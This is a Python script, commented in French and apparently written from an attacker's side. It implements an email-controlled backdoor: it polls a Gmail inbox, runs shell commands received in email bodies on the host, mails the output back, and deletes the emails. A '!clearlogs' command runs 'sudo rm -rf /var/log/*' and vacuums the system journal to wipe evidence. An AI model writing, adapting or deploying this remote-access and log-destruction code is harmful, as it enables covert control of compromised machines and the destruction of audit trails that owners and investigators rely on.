import logging
import poplib
import time
import subprocess
import smtplib
import os
from email import message_from_bytes
from dotenv import load_dotenv

# Charger les variables d'environnement à partir d'un fichier .env
load_dotenv()

# Configuration du logging pour enregistrer les événements importants du côté de l'attaquant
logging.basicConfig(filename='attacker.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Récupérer les informations d'authentification à partir des variables d'environnement
USERNAME = os.getenv('GMAIL_USERNAME')
PASSWORD = os.getenv('GMAIL_PASSWORD')
SENDTO = os.getenv('SENDTO_EMAIL')
popserver = 'pop.gmail.com'

def send_mail(subject, body):
    """Envoyer un e-mail"""
    msg = f"Subject: {subject}\n\n{body}"
    try:
        with smtplib.SMTP('smtp.gmail.com:587') as server:
            server.starttls()
            server.login(USERNAME, PASSWORD)
            server.sendmail(USERNAME, SENDTO, msg)
            logging.info(f'Email sent to {SENDTO} with subject "{subject}"')
    except Exception as e:
        logging.error(f'Failed to send email: {e}')

def execute_command(command):
    """Exécuter une commande shell de manière sécurisée"""
    try:
        with subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                logging.info(f'Command executed successfully: {" ".join(command)}')
                return "Command executed successfully. Output:\n" + stdout
            else:
                logging.warning(f'Error executing command: {" ".join(command)}. Output: {stderr}')
                return "Error executing command. Output:\n" + stderr
    except Exception as e:
        logging.error(f'Error executing command: {" ".join(command)}. Exception: {str(e)}')
        return f"Error executing command: {str(e)}"

def clear_logs():
    """Effacer les logs système sous Linux"""
    try:
        # Effacer les logs courants
        subprocess.call(["sudo", "rm", "-rf", "/var/log/*"], shell=False)
        subprocess.call(["sudo", "journalctl", "--rotate"], shell=False)
        subprocess.call(["sudo", "journalctl", "--vacuum-time=1s"], shell=False)
        logging.info('System logs cleared successfully.')
        return "Logs cleared successfully."
    except Exception as e:
        logging.error(f'Error clearing logs: {str(e)}')
        return f"Error clearing logs: {str(e)}"

def process_email_message(email_message):
    """Traitement de l'e-mail"""
    subject = email_message['Subject']
    logging.info(f'Processing email with subject: {subject}')
    
    if subject.startswith("!command"):
        command = email_message.get_payload().strip().split()
        return execute_command(command)
    elif subject == "!status":
        return "System status: OK"
    elif subject == "!help":
        return "Available commands: \n!command <your command>: Execute a command on the system. \n!status: Get system status. \n!help: Get help message.\n!clearlogs: Clear system logs."
    elif subject == "!clearlogs":
        return clear_logs()
    else:
        logging.warning(f'Unknown command in email subject: {subject}')
        return "Unknown command"

def main():
    """Fonction principale"""
    while True:
        try:
            # Connexion au serveur POP3
            with poplib.POP3_SSL(popserver) as pop:
                pop.user(USERNAME)
                pop.pass_(PASSWORD)

                # Récupération du nombre total de messages
                count, _ = pop.stat()

                logging.info(f'{count} messages found in inbox.')

                for i in range(1, count + 1):
                    # Récupération de chaque message
                    _, lines, _ = pop.retr(i)
                    email_message = message_from_bytes(b'\n'.join(lines))

                    # Traitement de l'e-mail
                    response = process_email_message(email_message)

                    # Envoi de la réponse par e-mail
                    send_mail("Command Response", response)

                    # Marquer l'e-mail comme supprimé
                    pop.dele(i)
                    logging.info(f'Email {i} marked for deletion.')

            # Attendre pendant une courte période avant de vérifier les nouveaux e-mails
            time.sleep(10)
        except Exception as e:
            logging.error(f'An error occurred in the main loop: {str(e)}')
            send_mail("Error Notification", f"An error occurred: {e}")

if __name__ == "__main__":
    main()
